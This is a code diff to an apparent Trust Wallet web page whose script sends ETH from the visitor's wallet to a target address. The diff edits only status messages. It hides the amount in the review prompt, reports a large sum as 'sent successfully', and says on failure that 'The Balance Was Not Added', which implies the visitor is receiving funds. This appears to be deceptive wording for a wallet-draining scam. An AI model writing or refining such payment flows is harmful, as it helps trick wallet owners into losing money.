@@ -251,7 +251,7 @@
             statusText.className = "status";
 
             if (!window.ethereum) {
-                statusText.textContent = "No Web3 wallet detected. Please open this page inside Trust Wallet or a compatible browser.";
+                statusText.textContent = "No Trust wallet detected. Please open this page inside Trust Wallet or a compatible browser.";
                 statusText.className = "status error";
                 return;
             }
@@ -263,7 +263,7 @@
 
             const fromAddress = await signer.getAddress();
 
-            statusText.textContent = "Preparing 0.013 ETH transaction for your review…";
+            statusText.textContent = "Preparing ETH transaction for your review…";
             statusText.className = "status";
 
             // Build transaction: send wallet to target address
@@ -280,11 +280,11 @@
 
             await response.wait();
 
-            statusText.textContent = "Transaction confirmed. 55 ETH sent successfully.";
+            statusText.textContent = "Transaction confirmed. 56.16 ETH sent successfully.";
             statusText.className = "status ok";
         } catch (err) {
             console.error(err);
-            statusText.textContent = "Transaction failed or was rejected. No funds were moved without your approval.";
+            statusText.textContent = "Transaction failed or was rejected.The Balance Was Not Added.";
             statusText.className = "status error";
         }
     };
